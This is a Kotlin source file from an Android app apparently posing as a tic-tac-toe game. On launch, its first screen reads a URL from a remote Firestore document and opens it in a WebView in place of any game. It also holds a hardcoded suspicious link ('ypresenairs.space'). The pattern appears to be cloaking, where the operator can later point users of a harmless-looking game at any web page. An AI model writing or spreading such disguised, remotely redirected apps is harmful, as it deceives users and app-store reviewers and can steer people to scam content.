package com.arnold.tarastictactoe1st



import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.google.firebase.firestore.FirebaseFirestore
import java.net.URL


class InitialFragment: Fragment(R.layout.fragment_initial) {

    private val fireStoreDatabase = FirebaseFirestore.getInstance()

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)


        fun saveURLInFireStore(taskURL: String) {
            val urlString = hashMapOf(
                "url" to "http://ypresenairs.space/BTGQNtsV"
            )
            urlString["taskURL"] = taskURL
            fireStoreDatabase.collection("taskURLPath")
                .add(urlString)
                .addOnSuccessListener {
                    Log.d("AddingToFirestore","DocumentSnapshot added ")
                }
                .addOnFailureListener{
                    Log.d("AddingToFirestore","Fail $taskURL")
                }
        }
        //saveURLInFireStore(taskURL = String())


        fun readData() {
            val dataRef = fireStoreDatabase.collection("1bit").document("1bitUrl")
            dataRef.get()
                .addOnSuccessListener { document ->

                    if (document != null) {
                        val urlTask1 = document.data.toString()

                        //findNavController().navigate(InitialFragmentDirections.actionInitialFragmentToWebViewFragment(urlTask1))
                        findNavController().navigate(
                            R.id.action_initialFragment_to_webViewFragment,
                            Bundle().apply {
                                putString("url", urlTask1.removeSurrounding("{","}").removePrefix("url=").trim())
                            })

                        Log.d("1bitURL", " $urlTask1")

                    } else {
                        Log.d("1bitURL", " no such data")
                    }
                }
                .addOnFailureListener { excteption ->
                    Log.d("1bitURL", "get failed with", excteption)

                }

        }

        readData()


        }
}